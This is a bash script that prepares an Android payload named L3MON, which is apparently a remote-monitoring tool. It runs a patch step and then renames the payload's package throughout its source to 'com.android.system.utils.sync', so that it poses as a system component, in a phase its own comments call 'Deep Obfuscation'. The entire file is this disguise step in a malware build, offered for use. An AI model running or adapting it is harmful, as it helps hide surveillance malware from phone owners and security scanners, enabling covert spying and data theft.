#!/bin/bash
set -e

OLD_PKG="com.etechd.l3mon"
NEW_PKG="com.android.system.utils.sync"
OLD_PATH="com/etechd/l3mon"
NEW_PATH="com/android/system/utils/sync"

echo "Phase 1: Remediation..."
chmod +x patch_payload.sh
./patch_payload.sh

echo "Phase 2: Deep Obfuscation & Refactoring..."
# Rename Package in all files (Mac-Safe Perl)
find payload_source -type f -exec perl -i -pe "s|$OLD_PKG|$NEW_PKG|g" {} +
find payload_source -type f -exec perl -i -pe "s|$OLD_PATH|$NEW_PATH|g" {} +

# Move files to new path
mkdir -p "payload_source/smali/$NEW_PATH"
if [ -d "payload_source/smali/$OLD_PATH" ]; then
    mv payload_source/smali/$OLD_PATH/* "payload_source/smali/$NEW_PATH/"
    rm -rf "payload_source/smali/com/etechd"
fi

echo "Payload ready for Phase 3."
